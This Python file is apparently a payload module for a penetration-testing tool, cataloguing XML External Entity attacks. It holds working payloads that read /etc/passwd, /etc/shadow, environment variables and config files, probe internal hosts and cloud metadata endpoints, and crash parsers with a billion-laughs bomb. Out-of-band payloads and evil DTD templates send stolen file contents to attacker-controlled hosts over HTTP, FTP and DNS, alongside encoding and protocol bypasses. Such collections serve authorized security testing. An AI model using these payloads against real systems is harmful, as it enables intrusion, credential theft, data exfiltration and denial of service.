"""
XML External Entity (XXE) Payloads
Includes OOB exfiltration techniques
"""

XXE_PAYLOADS = {
    "detection": [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test "XXE_DETECTED">]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    ],

    "file_read": [
        # Basic file read
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/boot.ini">]><foo>&xxe;</foo>',

        # PHP filter (for base64 encoding binary files)
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>',
    ],

    "ssrf": [
        # Internal network scanning
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:22/">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.1/">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',  # AWS metadata
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]><foo>&xxe;</foo>',  # GCP metadata
    ],

    "parameter_entities": [
        # Parameter entity for bypass
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY test "%xxe;">]><foo>&test;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo>&send;</foo>',
    ],

    "cdata_wrapper": [
        # CDATA for special characters
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % start "<![CDATA["><!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % end "]]>"><!ENTITY % dtd SYSTEM "http://attacker.com/wrapper.dtd">%dtd;]><foo>&all;</foo>',
    ],

    "dos": [
        # Billion laughs attack (XML bomb) - USE WITH CAUTION
        '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">]><lolz>&lol4;</lolz>',
    ],

    "error_based": [
        # Error-based exfiltration
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///nonexistent/%file;">%xxe;]>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % error "<!ENTITY &#x25; exfil SYSTEM \'file:///nonexistent/%file;\'>">%error;%exfil;]>',
    ],
}

# Out-of-Band (OOB) XXE payloads
XXE_OOB_PAYLOADS = {
    "basic_oob": [
        # Basic OOB via HTTP
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER_SERVER/xxe">%xxe;]><foo>test</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://ATTACKER_SERVER/?data=test">]><foo>&xxe;</foo>',
    ],

    "file_exfil_oob": [
        # Exfiltrate file contents via OOB
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://ATTACKER_SERVER/evil.dtd">%dtd;%send;]><foo>test</foo>',
        # evil.dtd content: <!ENTITY % send SYSTEM "http://ATTACKER_SERVER/?data=%file;">
    ],

    "ftp_oob": [
        # FTP for larger data exfiltration
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://ATTACKER_SERVER/evil.dtd">%dtd;]><foo>test</foo>',
        # evil.dtd: <!ENTITY % send SYSTEM "ftp://ATTACKER_SERVER:2121/%file;">%send;
    ],

    "dns_oob": [
        # DNS exfiltration (bypass some firewalls)
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/hostname"><!ENTITY % dtd SYSTEM "http://ATTACKER_SERVER/evil.dtd">%dtd;]><foo>test</foo>',
        # evil.dtd: <!ENTITY % send SYSTEM "http://%file;.ATTACKER_DOMAIN/">%send;
    ],
}

# Evil DTD files for OOB exfiltration
XXE_EVIL_DTD = {
    "basic": '''<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER_SERVER/?data=%file;'>">
%eval;
%exfil;''',

    "ftp": '''<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://ATTACKER_SERVER:2121/%file;'>">
%eval;
%exfil;''',

    "error_based": '''<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;''',

    "php_expect": '''<!ENTITY % file SYSTEM "expect://id">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER_SERVER/?data=%file;'>">
%eval;
%exfil;''',
}

# XXE in different contexts
XXE_BY_CONTEXT = {
    "soap": '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
<soapenv:Body>
<test>&xxe;</test>
</soapenv:Body>
</soapenv:Envelope>''',

    "svg": '''<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
<text>&xxe;</text>
</svg>''',

    "xlsx": '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<worksheet>
<sheetData>
<row><c><v>&xxe;</v></c></row>
</sheetData>
</worksheet>''',

    "docx": '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
<w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body>
</w:document>''',

    "rss": '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<rss version="2.0">
<channel>
<title>&xxe;</title>
</channel>
</rss>''',

    "xslt": '''<?xml version="1.0"?>
<!DOCTYPE xsl:stylesheet [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
<xsl:template match="/">
<xsl:value-of select="'&xxe;'"/>
</xsl:template>
</xsl:stylesheet>''',
}

# Bypass techniques
XXE_BYPASS = {
    "encoding": [
        # UTF-16 encoding
        '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        # UTF-7 encoding
        '<?xml version="1.0" encoding="UTF-7"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    ],

    "protocol_wrappers": [
        # PHP wrappers
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://input">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',

        # Data URI
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "data://text/plain;base64,dGVzdA==">]><foo>&xxe;</foo>',

        # Jar protocol (Java)
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com/evil.jar!/file.txt">]><foo>&xxe;</foo>',

        # Gopher protocol
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://attacker.com:70/_test">]><foo>&xxe;</foo>',
    ],

    "xinclude": [
        # XInclude attack (when you can't control DTD)
        '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
    ],
}
